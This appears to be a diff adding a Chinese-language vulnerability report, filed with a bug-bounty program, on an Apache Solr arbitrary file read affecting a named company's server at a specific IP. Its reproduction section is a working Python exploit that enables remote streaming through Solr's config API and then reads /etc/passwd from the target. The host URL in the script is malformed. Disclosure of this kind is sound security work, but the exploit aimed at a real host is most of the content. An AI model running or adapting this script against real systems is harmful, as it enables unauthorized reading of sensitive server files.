@@ -1,0 +1,41 @@
+厂商名称：海能达通信股份有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://www.hytera.com:8983
+网站名称：海能达通信股份有限公司
+网站ip：52.83.194.161
+所属地区：深圳市南山区高新区北区北环路9108号海能达大厦
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：一般经营项目是：开发矿用对讲机、防爆通讯产品及配件、无线电通讯器材及配件，提供相关技术服务（不含限制项目）；无线电通讯器材软件的技术开发；通信工程的咨询和相关的技术服务；系统集成；计算机软件和通信软件开发；视频监控系统技术开发和销售及相关的技术咨询和服务（以上各项不含限制项目）；开发、销售数码产品；信息服务业务（不含互联网信息服务）；经营进出口业务（法律、行政法规、国务院禁止的项目除外，限制的项目须取得许可后方可经营）；自有物业租赁（不含限制项目）。通信设备制造；移动通信设备制造；移动通信设备销售。（除依法须经批准的项目外，凭营业执照依法自主开展经营活动），许可经营项目是：生产矿用对讲机、防爆通讯产品及配件、无线电通讯器材及配件；手机、通讯类产品、电子类产品、执法记录仪的研发、生产和销售；信息传输、软件和信息技术服务业。
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://52.83.194.161:8983"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
